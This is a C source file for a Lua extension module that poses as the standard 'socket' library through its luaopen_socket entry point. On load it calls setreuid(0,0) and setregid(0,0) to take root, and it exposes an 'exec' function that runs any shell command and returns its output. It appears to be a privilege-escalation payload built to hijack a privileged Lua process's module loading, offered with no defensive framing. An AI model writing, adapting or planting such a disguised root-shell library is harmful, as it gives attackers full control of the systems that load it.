#include <lauxlib.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <lua.h>

static int l_exec(lua_State*L){
	const char*command=luaL_checkstring(L,1);
	FILE*fp=popen(command,"r");
	if(!fp)return 1;
	char buffer[4096],*result=calloc(8192,1);
	size_t pos=0;
	while(fgets(buffer,sizeof(buffer),fp)){
		size_t len=strlen(buffer);
		if(pos+len>=8191)break;
		memcpy(result+pos,buffer,len);
		pos+=len;
	}
	pclose(fp);
	lua_pushstring(L,result);
	free(result);
	return 1;
}

static const luaL_Reg socket_lib[]={{"exec",l_exec},{NULL,NULL}};

int luaopen_socket(lua_State*L){
	setreuid(0,0);
	setregid(0,0);
	luaL_newlib(L,socket_lib);
	return 1;
}
	// by azuk4r
